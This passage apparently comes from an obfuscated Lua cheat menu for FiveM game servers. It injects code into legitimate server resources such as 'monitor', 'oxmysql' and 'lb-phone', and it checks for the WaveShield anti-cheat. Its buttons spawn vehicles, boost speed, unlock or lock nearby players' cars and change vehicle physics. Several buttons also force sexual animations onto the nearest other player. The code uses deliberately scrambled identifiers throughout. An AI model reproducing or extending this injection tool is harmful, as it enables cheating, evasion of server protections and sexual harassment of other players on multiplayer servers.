                local VcZoPwLsEkRn = math.floor
                local DfHkLtQwAzCx = math.sin
                local PlJoQwErTgYs = CreateThread
                local MzLxVoKsUyNz = GetVehiclePedIsIn
                local EyUiNkOpLtRg = PlayerPedId
                local KxFwEmTrZpYq = DoesEntityExist
                local UfBnDxCrQeTg = SetVehicleCustomPrimaryColour
                local BvNzMxLoPwEq = SetVehicleCustomSecondaryColour

                local yGfTzLkRn = 1.0

                local function HrCvWbXuNz(freq)
                    local color = {}
                    local t = WvBnMpLsQzTx() / 1000
                    color.r = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 0) * 127 + 128)
                    color.g = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 2) * 127 + 128)
                    color.b = VcZoPwLsEkRn(DfHkLtQwAzCx(t * freq + 4) * 127 + 128)
                    return color
                end

                PlJoQwErTgYs(function()
                    while GxRpVuNzYiTq and not Unloaded do
                        local ped = EyUiNkOpLtRg()
                        local veh = MzLxVoKsUyNz(ped, false)
                        if veh and veh ~= 0 and KxFwEmTrZpYq(veh) then
                            local rgb = HrCvWbXuNz(yGfTzLkRn)
                            UfBnDxCrQeTg(veh, rgb.r, rgb.g, rgb.b)
                            BvNzMxLoPwEq(veh, rgb.r, rgb.g, rgb.b)
                        end
                        Wait(0)
                    end
                end)
            end

            jqX7TvYzWq()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            GxRpVuNzYiTq = false
        ]]);end);MachoMenuCheckbox(v43[407 -(183 + 223) ],"Drift Mode (Hold Shift)",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if MqTwErYuIoLp == nil then MqTwErYuIoLp = false end
            MqTwErYuIoLp = true

            local function PlRtXqJm92()
                local XtFgDsQwAzLp = CreateThread
                local UiOpAsDfGhKl = PlayerPedId
                local JkHgFdSaPlMn = GetVehiclePedIsIn
                local WqErTyUiOpAs = IsControlPressed
                local AsZxCvBnMaSd = DoesEntityExist
                local KdJfGvBhNtMq = SetVehicleReduceGrip

                XtFgDsQwAzLp(function()
                    while MqTwErYuIoLp and not Unloaded do
                        Wait(0)
                        local ped = UiOpAsDfGhKl()
                        local veh = JkHgFdSaPlMn(ped, false)
                        if veh ~= 0 and AsZxCvBnMaSd(veh) then
                            if WqErTyUiOpAs(0, 21) then
                                KdJfGvBhNtMq(veh, true)
                            else
                                KdJfGvBhNtMq(veh, false)
                            end
                        end
                    end
                end)
            end

            PlRtXqJm92()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            MqTwErYuIoLp = false
            local ZtQwErTyUiOp = PlayerPedId
            local DfGhJkLzXcVb = GetVehiclePedIsIn
            local VbNmAsDfGhJk = DoesEntityExist
            local NlJkHgFdSaPl = SetVehicleReduceGrip

            local ped = ZtQwErTyUiOp()
            local veh = DfGhJkLzXcVb(ped, false)
            if veh ~= 0 and VbNmAsDfGhJk(veh) then
                NlJkHgFdSaPl(veh, false)
            end
        ]]);end);MachoMenuCheckbox(v43[1],"Easy Handling",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if NvGhJkLpOiUy == nil then NvGhJkLpOiUy = false end
            NvGhJkLpOiUy = true

            local function KbZwVoYtLx()
                local BtGhYtUlOpLk = CreateThread
                local WeRtYuIoPlMn = PlayerPedId
                local TyUiOpAsDfGh = GetVehiclePedIsIn
                local UyTrBnMvCxZl = SetVehicleGravityAmount
                local PlMnBvCxZaSd = SetVehicleStrong

                BtGhYtUlOpLk(function()
                    while NvGhJkLpOiUy and not Unloaded do
                        local ped = WeRtYuIoPlMn()
                        local veh = TyUiOpAsDfGh(ped, false)
                        if veh and veh ~= 0 then
                            UyTrBnMvCxZl(veh, 73.0)
                            PlMnBvCxZaSd(veh, true)
                        end
                        Wait(0)
                    end

                    local ped = WeRtYuIoPlMn()
                    local veh = TyUiOpAsDfGh(ped, false)
                    if veh and veh ~= 0 then
                        UyTrBnMvCxZl(veh, 9.8)
                        PlMnBvCxZaSd(veh, false)
                    end
                end)
            end

            KbZwVoYtLx()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            NvGhJkLpOiUy = false
            local UyTrBnMvCxZl = SetVehicleGravityAmount
            local PlMnBvCxZaSd = SetVehicleStrong
            local ped = PlayerPedId()
            local veh = GetVehiclePedIsIn(ped, false)
            if veh and veh ~= 0 then
                UyTrBnMvCxZl(veh, 9.8)
                PlMnBvCxZaSd(veh, false)
            end
        ]]);end);MachoMenuCheckbox(v43[1 -0 ],"Shift Boost",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if QwErTyUiOpSh == nil then QwErTyUiOpSh = false end
            QwErTyUiOpSh = true

            local function ZxCvBnMmLl()
                local aAaBbCcDdEe = CreateThread
                local fFfGgGgHhIi = Wait
                local jJkKlLmMnNo = PlayerPedId
                local pPqQrRsStTu = IsPedInAnyVehicle
                local vVwWxXyYzZa = GetVehiclePedIsIn
                local bBcCdDeEfFg = IsDisabledControlJustPressed
                local sSeEtTvVbBn = SetVehicleForwardSpeed

                aAaBbCcDdEe(function()
                    while QwErTyUiOpSh and not Unloaded do
                        local _ped = jJkKlLmMnNo()
                        if pPqQrRsStTu(_ped, false) then
                            local _veh = vVwWxXyYzZa(_ped, false)
                            if _veh ~= 0 and bBcCdDeEfFg(0, 21) then
                                sSeEtTvVbBn(_veh, 150.0)
                            end
                        end
                        fFfGgGgHhIi(0)
                    end
                end)
            end

            ZxCvBnMmLl()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            QwErTyUiOpSh = false
        ]]);end);MachoMenuCheckbox(v43[1],"Instant Breaks",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if VkLpOiUyTrEq == nil then VkLpOiUyTrEq = false end
            VkLpOiUyTrEq = true

            local function YgT7FrqXcN()
                local ZxSeRtYhUiOp = CreateThread
                local LkJhGfDsAzXv = PlayerPedId
                local PoLkJhBgVfCd = GetVehiclePedIsIn
                local ErTyUiOpAsDf = IsDisabledControlPressed
                local GtHyJuKoLpMi = IsPedInAnyVehicle
                local VbNmQwErTyUi = SetVehicleForwardSpeed

                ZxSeRtYhUiOp(function()
                    while VkLpOiUyTrEq and not Unloaded do
                        local ped = LkJhGfDsAzXv()
                        local veh = PoLkJhBgVfCd(ped, false)
                        if veh and veh ~= 0 then
                            if ErTyUiOpAsDf(0, 33) and GtHyJuKoLpMi(ped, false) then
                                VbNmQwErTyUi(veh, 0.0)
                            end
                        end
                        Wait(0)
                    end
                end)
            end

            YgT7FrqXcN()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            VkLpOiUyTrEq = false
        ]]);end);MachoMenuCheckbox(v43[1 + 0 ],"Unlimited Fuel",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if BlNkJmLzXcVb == nil then BlNkJmLzXcVb = false end
            BlNkJmLzXcVb = true

            local function LqWyXpR3tV()
                local TmPlKoMiJnBg = CreateThread
                local ZxCvBnMaSdFg = PlayerPedId
                local YhUjIkOlPlMn = IsPedInAnyVehicle
                local VcXzQwErTyUi = GetVehiclePedIsIn
                local KpLoMkNjBhGt = DoesEntityExist
                local JkLzXcVbNmAs = SetVehicleFuelLevel

                TmPlKoMiJnBg(function()
                    while BlNkJmLzXcVb and not Unloaded do
                        local ped = ZxCvBnMaSdFg()
                        if YhUjIkOlPlMn(ped, false) then
                            local veh = VcXzQwErTyUi(ped, false)
                            if KpLoMkNjBhGt(veh) then
                                JkLzXcVbNmAs(veh, 100.0)
                            end
                        end
                        Wait(100)
                    end
                end)
            end

            LqWyXpR3tV()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            BlNkJmLzXcVb = false
        ]]);end);local v56=MachoMenuInputbox(v43[1 + 1 ],"License Plate:","...");MachoMenuButton(v43[339 -(10 + 327) ],"Set License Plate",function() local v206=MachoMenuGetInputbox(v56);if ((type(v206)=="string") and (v206~="")) then local v294=0 + 0 ;local v295;while true do if (v294==(338 -(118 + 220))) then v295=string.format([[
                local function xKqLZVwPt9()
                    local XcVbNmAsDfGhJkL = PlayerPedId
                    local TyUiOpZxCvBnMzLk = GetVehiclePedIsIn
                    local PoIuYtReWqAzXsDc = _G.SetVehicleNumberPlateText

                    local pEd = XcVbNmAsDfGhJkL()
                    local vEh = TyUiOpZxCvBnMzLk(pEd, false)

                    if vEh and vEh ~= 0 then
                        PoIuYtReWqAzXsDc(vEh, "%s")
                    end

                end

                xKqLZVwPt9()
            ]],v206);MachoInjectResource((v48("monitor") and "monitor") or "any" ,v295);break;end end end end);local v57=MachoMenuInputbox(v43[1 + 1 ],"Vehicle Model:","...");MachoMenuButton(v43[451 -(108 + 341) ],"Spawn Car",function() local v207=0 + 0 ;local v208;local v209;local v210;local v211;while true do if (v207==0) then v208=MachoMenuGetInputbox(v57);v209=GetResourceState("WaveShield")=="started" ;v207=4 -3 ;end if (v207==(1495 -(711 + 782))) then if ( not v209 and v210) then v211=([[ 
                if type(CreateFrameworkVehicle) == "function" then
                    local model = "%s"
                    local hash = GetHashKey(model)
                    local ped = PlayerPedId()
                    if DoesEntityExist(ped) then
                        local coords = GetEntityCoords(ped)
                        if coords then
                            local vehicleData = {
                                vehicle = json.encode({ model = model })
                            }
                            CreateFrameworkVehicle(vehicleData, coords)
                        end
                    end
                end
            ]]):format(v208);MachoInjectResource("lb-phone",v211);else local v373=0 -0 ;while true do if (v373==(469 -(270 + 199))) then v211=([[ 
                local function XzRtVbNmQwEr()
                    local tYaPlXcUvBn = PlayerPedId
                    local iKoMzNbHgTr = GetEntityCoords
                    local wErTyUiOpAs = GetEntityHeading
                    local hGtRfEdCvBg = RequestModel
                    local bNjMkLoIpUh = HasModelLoaded
                    local pLkJhGfDsAq = Wait
                    local sXcVbNmZlQw = GetVehiclePedIsIn
                    local yUiOpAsDfGh = DeleteVehicle
                    local aSxDcFgHvBn = _G.CreateVehicle
                    local oLpKjHgFdSa = NetworkGetNetworkIdFromEntity
                    local zMxNaLoKvRe = SetEntityAsMissionEntity
                    local mVbGtRfEdCv = SetVehicleOutOfControl
                    local eDsFgHjKlQw = SetVehicleHasBeenOwnedByPlayer
                    local lAzSdXfCvBg = SetNetworkIdExistsOnAllMachines
                    local nMqWlAzXcVb = NetworkSetEntityInvisibleToNetwork
                    local vBtNrEuPwOa = SetNetworkIdCanMigrate
                    local gHrTyUjLoPk = SetModelAsNoLongerNeeded
                    local kLoMnBvCxZq = TaskWarpPedIntoVehicle

                    local bPeDrTfGyHu = tYaPlXcUvBn()
                    local cFiGuHvYbNj = iKoMzNbHgTr(bPeDrTfGyHu)
                    local jKgHnJuMkLp = wErTyUiOpAs(bPeDrTfGyHu)
                    local nMiLoPzXwEq = "%s"

                    hGtRfEdCvBg(nMiLoPzXwEq)
                    while not bNjMkLoIpUh(nMiLoPzXwEq) do
                        pLkJhGfDsAq(100)
                    end

                    local fVbGtFrEdSw = sXcVbNmZlQw(bPeDrTfGyHu, false)
                    if fVbGtFrEdSw and fVbGtFrEdSw ~= 0 then
                        yUiOpAsDfGh(fVbGtFrEdSw)
                    end

                    local xFrEdCvBgTn = aSxDcFgHvBn(nMiLoPzXwEq, cFiGuHvYbNj.x + 2.5, cFiGuHvYbNj.y, cFiGuHvYbNj.z, jKgHnJuMkLp, true, false)
                    local sMnLoKiJpUb = oLpKjHgFdSa(xFrEdCvBgTn)

                    zMxNaLoKvRe(xFrEdCvBgTn, true, true)
                    mVbGtRfEdCv(xFrEdCvBgTn, false, false)
                    eDsFgHjKlQw(xFrEdCvBgTn, false)
                    lAzSdXfCvBg(sMnLoKiJpUb, true)
                    nMqWlAzXcVb(xFrEdCvBgTn, false)
                    vBtNrEuPwOa(sMnLoKiJpUb, true)
                    gHrTyUjLoPk(nMiLoPzXwEq)

                    kLoMnBvCxZq(bPeDrTfGyHu, xFrEdCvBgTn, -1)
                end

                XzRtVbNmQwEr()
            ]]):format(v208);MachoInjectResource((v48("monitor") and "monitor") or "any" ,v211);break;end end end break;end if (v207==(1 + 0)) then v210=GetResourceState("lb-phone")=="started" ;v211=nil;v207=2;end end end);MachoMenuButton(v43[3],"Repair Vehicle",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function FgN7LqxZyP()
                local aBcD = PlayerPedId
                local eFgH = GetVehiclePedIsIn
                local iJkL = SetVehicleFixed
                local mNoP = SetVehicleDeformationFixed

                local p = aBcD()
                local v = eFgH(p, false)
                if v and v ~= 0 then
                    iJkL(v)
                    mNoP(v)
                end
            end

            FgN7LqxZyP()
        ]]);end);MachoMenuButton(v43[1822 -(580 + 1239) ],"Flip Vehicle",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function vXmYLT9pq2()
                local a = PlayerPedId
                local b = GetVehiclePedIsIn
                local c = GetEntityHeading
                local d = SetEntityRotation

                local ped = a()
                local veh = b(ped, false)
                if veh and veh ~= 0 then
                    d(veh, 0.0, 0.0, c(veh))
                end
            end

            vXmYLT9pq2()
        ]]);end);MachoMenuButton(v43[8 -5 ],"Clean Vehicle",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function qPwRYKz7mL()
                local a = PlayerPedId
                local b = GetVehiclePedIsIn
                local c = SetVehicleDirtLevel

                local ped = a()
                local veh = b(ped, false)
                if veh and veh ~= 0 then
                    c(veh, 0.0)
                end
            end

            qPwRYKz7mL()
        ]]);end);MachoMenuButton(v43[3],"Delete Vehicle",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function LXpTqWvR80()
                local aQw = PlayerPedId
                local bEr = GetVehiclePedIsIn
                local cTy = DoesEntityExist
                local dUi = NetworkHasControlOfEntity
                local eOp = SetEntityAsMissionEntity
                local fAs = DeleteEntity
                local gDf = DeleteVehicle
                local hJk = SetVehicleHasBeenOwnedByPlayer

                local ped = aQw()
                local veh = bEr(ped, false)

                if veh and veh ~= 0 and cTy(veh) then
                    hJk(veh, true)
                    eOp(veh, true, true)

                    if dUi(veh) then
                        fAs(veh)
                        gDf(veh)
                    end
                end

            end

            LXpTqWvR80()
        ]]);end);MachoMenuButton(v43[3],"Toggle Vehicle Engine",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function NKzqVoXYLm()
                local a = PlayerPedId
                local b = GetVehiclePedIsIn
                local c = GetIsVehicleEngineRunning
                local d = SetVehicleEngineOn

                local ped = a()
                local veh = b(ped, false)
                if veh and veh ~= 0 then
                    if c(veh) then
                        d(veh, false, true, true)
                    else
                        d(veh, true, true, false)
                    end
                end
            end

            NKzqVoXYLm()
        ]]);end);MachoMenuButton(v43[3],"Max Vehicle Upgrades",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function XzPmLqRnWyBtVkGhQe()
                local FnUhIpOyLkTrEzSd = PlayerPedId
                local VmBgTnQpLcZaWdEx = GetVehiclePedIsIn
                local RfDsHuNjMaLpOyBt = SetVehicleModKit
                local AqWsEdRzXcVtBnMa = SetVehicleWheelType
                local TyUiOpAsDfGhJkLz = GetNumVehicleMods
                local QwErTyUiOpAsDfGh = SetVehicleMod
                local ZxCvBnMqWeRtYuIo = ToggleVehicleMod
                local MnBvCxZaSdFgHjKl = SetVehicleWindowTint
                local LkJhGfDsQaZwXeCr = SetVehicleTyresCanBurst
                local UjMiKoLpNwAzSdFg = SetVehicleExtra
                local RvTgYhNuMjIkLoPb = DoesExtraExist

                local lzQwXcVeTrBnMkOj = FnUhIpOyLkTrEzSd()
                local jwErTyUiOpMzNaLk = VmBgTnQpLcZaWdEx(lzQwXcVeTrBnMkOj, false)
                if not jwErTyUiOpMzNaLk or jwErTyUiOpMzNaLk == 0 then return end

                RfDsHuNjMaLpOyBt(jwErTyUiOpMzNaLk, 0)
                AqWsEdRzXcVtBnMa(jwErTyUiOpMzNaLk, 7)

                for XyZoPqRtWnEsDfGh = 0, 16 do
                    local uYtReWqAzXsDcVf = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh)
                    if uYtReWqAzXsDcVf and uYtReWqAzXsDcVf > 0 then
                        QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh, uYtReWqAzXsDcVf - 1, false)
                    end
                end

                QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 14, 16, false)

                local aSxDcFgHiJuKoLpM = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, 15)
                if aSxDcFgHiJuKoLpM and aSxDcFgHiJuKoLpM > 1 then
                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 15, aSxDcFgHiJuKoLpM - 2, false)
                end

                for QeTrBnMkOjHuYgFv = 17, 22 do
                    ZxCvBnMqWeRtYuIo(jwErTyUiOpMzNaLk, QeTrBnMkOjHuYgFv, true)
                end

                QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 23, 1, false)
                QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 24, 1, false)

                for TpYuIoPlMnBvCxZq = 1, 12 do
                    if RvTgYhNuMjIkLoPb(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq) then
                        UjMiKoLpNwAzSdFg(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq, false)
                    end
                end

                MnBvCxZaSdFgHjKl(jwErTyUiOpMzNaLk, 1)
                LkJhGfDsQaZwXeCr(jwErTyUiOpMzNaLk, false)
            end

            XzPmLqRnWyBtVkGhQe()
        ]]);end);MachoMenuButton(v43[3],"Teleport into Closest Vehicle",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function uPKcoBaEHmnK()
                local ziCFzHyzxaLX = SetPedIntoVehicle
                local YPPvDlOGBghA = GetClosestVehicle

                local Coords = GetEntityCoords(PlayerPedId())
                local vehicle = YPPvDlOGBghA(Coords.x, Coords.y, Coords.z, 15.0, 0, 70)

                if DoesEntityExist(vehicle) and not IsPedInAnyVehicle(PlayerPedId(), false) then
                    if GetPedInVehicleSeat(vehicle, -1) == 0 then
                        ziCFzHyzxaLX(PlayerPedId(), vehicle, -1)
                    else
                        ziCFzHyzxaLX(PlayerPedId(), vehicle, 0)
                    end
                end
            end

            uPKcoBaEHmnK()
        ]]);end);MachoMenuButton(v43[3],"Unlock Closest Vehicle",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function TpLMqKtXwZ()
                local AsoYuTrBnMvCxZaQw = PlayerPedId
                local GhrTnLpKjUyVbMnZx = GetEntityCoords
                local UyeWsDcXzQvBnMaLp = GetClosestVehicle
                local ZmkLpQwErTyUiOpAs = DoesEntityExist
                local VczNmLoJhBgVfCdEx = SetEntityAsMissionEntity
                local EqWoXyBkVsNzQuH = SetVehicleDoorsLocked
                local YxZwQvTrBnMaSdFgHj = SetVehicleDoorsLockedForAllPlayers
                local RtYuIoPlMnBvCxZaSd = SetVehicleHasBeenOwnedByPlayer
                local LkJhGfDsAzXwCeVrBt = NetworkHasControlOfEntity

                local ped = AsoYuTrBnMvCxZaQw()
                local coords = GhrTnLpKjUyVbMnZx(ped)
                local veh = UyeWsDcXzQvBnMaLp(coords.x, coords.y, coords.z, 10.0, 0, 70)

                if veh and ZmkLpQwErTyUiOpAs(veh) and LkJhGfDsAzXwCeVrBt(veh) then
                    VczNmLoJhBgVfCdEx(veh, true, true)
                    RtYuIoPlMnBvCxZaSd(veh, true)
                    EqWoXyBkVsNzQuH(veh, 1)
                    YxZwQvTrBnMaSdFgHj(veh, false)
                end

            end

            TpLMqKtXwZ()
        ]]);end);MachoMenuButton(v43[3 + 0 ],"Lock Closest Vehicle",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function tRYpZvKLxQ()
                local WqEoXyBkVsNzQuH = PlayerPedId
                local LoKjBtWxFhPoZuR = GetEntityCoords
                local VbNmAsDfGhJkLzXcVb = GetClosestVehicle
                local TyUiOpAsDfGhJkLzXc = DoesEntityExist
                local PlMnBvCxZaSdFgTrEq = SetEntityAsMissionEntity
                local KjBtWxFhPoZuRZlK = SetVehicleHasBeenOwnedByPlayer
                local AsDfGhJkLzXcVbNmQwE = SetVehicleDoorsLocked
                local QwEoXyBkVsNzQuHL = SetVehicleDoorsLockedForAllPlayers
                local ZxCvBnMaSdFgTrEqWz = NetworkHasControlOfEntity

                local ped = WqEoXyBkVsNzQuH()
                local coords = LoKjBtWxFhPoZuR(ped)
                local veh = VbNmAsDfGhJkLzXcVb(coords.x, coords.y, coords.z, 10.0, 0, 70)

                if veh and TyUiOpAsDfGhJkLzXc(veh) and ZxCvBnMaSdFgTrEqWz(veh) then
                    PlMnBvCxZaSdFgTrEq(veh, true, true)
                    KjBtWxFhPoZuRZlK(veh, true)
                    AsDfGhJkLzXcVbNmQwE(veh, 2)
                    QwEoXyBkVsNzQuHL(veh, true)
                end
            end

            tRYpZvKLxQ()
        ]]);end);MachoMenuButton(v44[1 + 0 ],"Force Emotes [Be careful]",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            Citizen.CreateThread(function()
        local playerPed = PlayerPedId()
        local playerId = GetPlayerServerId(PlayerId())

        TriggerServerEvent("ServerEmoteRequest", playerId, "giveblowjob")
        Citizen.Wait(20000)
        TriggerServerEvent("ServerEmoteRequest", playerId, "giveblowjob")
        Citizen.Wait(20000)
        TriggerServerEvent("ServerEmoteRequest", playerId, "giveblowjob")
        Citizen.Wait(20000)
        TriggerServerEvent("ServerEmoteRequest", playerId, "giveblowjob")
        Citizen.Wait(20000)
        TriggerServerEvent("ServerEmoteRequest", playerId, "giveblowjob")
        Citizen.Wait(20000)
        TriggerServerEvent("ServerEmoteRequest", playerId, "giveblowjob")
        Citizen.Wait(20000)
        TriggerServerEvent("ServerEmoteRequest", playerId, "giveblowjob")
        Citizen.Wait(20000)
        TriggerServerEvent("ServerEmoteRequest", playerId, "giveblowjob")
        Citizen.Wait(20000)
        TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
        Citizen.Wait(20000)
        TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
        Citizen.Wait(20000)
        TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
        Citizen.Wait(20000)
        TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
        Citizen.Wait(20000)
        TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
        Citizen.Wait(20000)
        TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
        Citizen.Wait(20000)
        TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
        Citizen.Wait(20000)
        TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
        Citizen.Wait(20000)
        TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
        Citizen.Wait(20000)
        TriggerServerEvent("ServerEmoteRequest", playerId, "slapped")
    end)
        ]]);end);MachoMenuButton(v44[1 + 0 ],"Detach All Entitys",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function zXqLJWt7pN()
                local xPvA71LtqzW = ClearPedTasks
                local bXcT2mpqR9f = DetachEntity

                xPvA71LtqzW(PlayerPedId())
                bXcT2mpqR9f(PlayerPedId())
            end

            zXqLJWt7pN()
        ]]);end);MachoMenuButton(v44[2 -1 ],"Twerk On Them",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function OyWTpKvmXq()
                local closestPlayer, closestDistance = nil, math.huge
                local playerPed = PlayerPedId()
                local playerCoords = GetEntityCoords(playerPed)
                
                for _, playerId in ipairs(GetActivePlayers()) do
                    local targetPed = GetPlayerPed(playerId)
                    if targetPed ~= playerPed then
                        local targetCoords = GetEntityCoords(targetPed)
                        local distance = #(playerCoords - targetCoords)
                        
                        if distance < closestDistance then
                            closestDistance = distance
                            closestPlayer = playerId
                        end
                    end
                end

                if closestPlayer then
                    if StarkDaddy then
                        ClearPedSecondaryTask(playerPed)
                        DetachEntity(playerPed, true, false)
                        StarkDaddy = false
                    else
                        StarkDaddy = true
                        if not HasAnimDictLoaded("switch@trevor@mocks_lapdance") then
                            RequestAnimDict("switch@trevor@mocks_lapdance")
                            while not HasAnimDictLoaded("switch@trevor@mocks_lapdance") do
                                Wait(0)
                            end        
                        end

                        local targetPed = GetPlayerPed(closestPlayer)
                        AttachEntityToEntity(playerPed, targetPed, 4103, 0.05, 0.38, 0.0, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                        TaskPlayAnim(playerPed, "switch@trevor@mocks_lapdance", "001443_01_trvs_28_idle_stripper", 8.0, -8.0, 100000, 33, 0, false, false, false)
                    end
                end
            end

            OyWTpKvmXq()
        ]]);end);MachoMenuButton(v44[1],"Give Them Backshots",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function bXzLqPTMn9()
                local closestPlayer, closestDistance = nil, math.huge
                local playerPed = PlayerPedId()
                local playerCoords = GetEntityCoords(playerPed)

                for _, playerId in ipairs(GetActivePlayers()) do
                    local targetPed = GetPlayerPed(playerId)
                    if targetPed ~= playerPed then
                        local targetCoords = GetEntityCoords(targetPed)
                        local distance = #(playerCoords - targetCoords)

                        if distance < closestDistance then
                            closestDistance = distance
                            closestPlayer = playerId
                        end
                    end
                end

                if closestPlayer then
                    if StarkDaddy then
                        ClearPedSecondaryTask(playerPed)
                        DetachEntity(playerPed, true, false)
                        StarkDaddy = false
                    else
                        StarkDaddy = true
                        if not HasAnimDictLoaded("rcmpaparazzo_2") then
                            RequestAnimDict("rcmpaparazzo_2")
                            while not HasAnimDictLoaded("rcmpaparazzo_2") do
                                Wait(0)
                            end
                        end

                        local targetPed = GetPlayerPed(closestPlayer)
                        AttachEntityToEntity(PlayerPedId(), targetPed, 4103, 0.04, -0.4, 0.1, 0.0, 0.0, 0.0, false, false, false, false, 2, true)
                        TaskPlayAnim(PlayerPedId(), "rcmpaparazzo_2", "shag_loop_a", 8.0, -8.0, 100000, 33, 0, false, false, false)
                        TaskPlayAnim(GetPlayerPed(closestPlayer), "rcmpaparazzo_2", "shag_loop_poppy", 2.0, 2.5, -1, 49, 0, 0, 0, 0)
                    end
                end
            end

            bXzLqPTMn9()
        ]]);end);MachoMenuButton(v44[1 + 0 ],"Wank On Them",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function qXW7YpLtKv()
                local closestPlayer, closestDistance = nil, math.huge
                local playerPed = PlayerPedId()
                local playerCoords = GetEntityCoords(playerPed)

                for _, playerId in ipairs(GetActivePlayers()) do
                    local targetPed = GetPlayerPed(playerId)
                    if targetPed ~= playerPed then
                        local targetCoords = GetEntityCoords(targetPed)
                        local distance = #(playerCoords - targetCoords)

                        if distance < closestDistance then
                            closestDistance = distance
                            closestPlayer = playerId
                        end
                    end
                end

                if closestPlayer then
                    if isInPiggyBack then
                        ClearPedSecondaryTask(playerPed)
                        DetachEntity(playerPed, true, false)
                        wankoffperson = false
                    else
                        wankoffperson = true
                        if not HasAnimDictLoaded("mp_player_int_upperwank") then
                            RequestAnimDict("mp_player_int_upperwank")
                            while not HasAnimDictLoaded("mp_player_int_upperwank") do
                                Wait(0)
                            end
                        end
                    end

                    TaskPlayAnim(PlayerPedId(), "mp_player_int_upperwank", "mp_player_int_wank_01", 8.0, -8.0, -1, 51, 1.0, false, false, false)
                end
            end

            qXW7YpLtKv()
        ]]);end);MachoMenuButton(v44[1],"Piggyback On Player",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function RtKpqLmXZV()
                local closestPlayer, closestDistance = nil, math.huge
                local playerPed = PlayerPedId()
                local playerCoords = GetEntityCoords(playerPed)

                for _, playerId in ipairs(GetActivePlayers()) do
                    local targetPed = GetPlayerPed(playerId)
                    if targetPed ~= playerPed then
                        local targetCoords = GetEntityCoords(targetPed)
                        local distance = #(playerCoords - targetCoords)

                        if distance < closestDistance then
                            closestDistance = distance
                            closestPlayer = playerId
                        end
                    end
                end

                if closestPlayer then
                    if isInPiggyBack then
                        ClearPedSecondaryTask(playerPed)
                        DetachEntity(playerPed, true, false)
                        isInPiggyBack = false
                    else
                        isInPiggyBack = true
                        if not HasAnimDictLoaded("anim@arena@celeb@flat@paired@no_props@") then
                            RequestAnimDict("anim@arena@celeb@flat@paired@no_props@")
                            while not HasAnimDictLoaded("anim@arena@celeb@flat@paired@no_props@") do
                                Wait(0)
                            end
                        end

                        local targetPed = GetPlayerPed(closestPlayer)
                        AttachEntityToEntity(PlayerPedId(), targetPed, 0, 0.0, -0.25, 0.45, 0.5, 0.5, 180, false, false, false, false, 2, false)
                        TaskPlayAnim(PlayerPedId(), "anim@arena@celeb@flat@paired@no_props@", "piggyback_c_player_b", 8.0, -8.0, 1000000, 33, 0, false, false, false)
                    end
                end
            end

            RtKpqLmXZV()
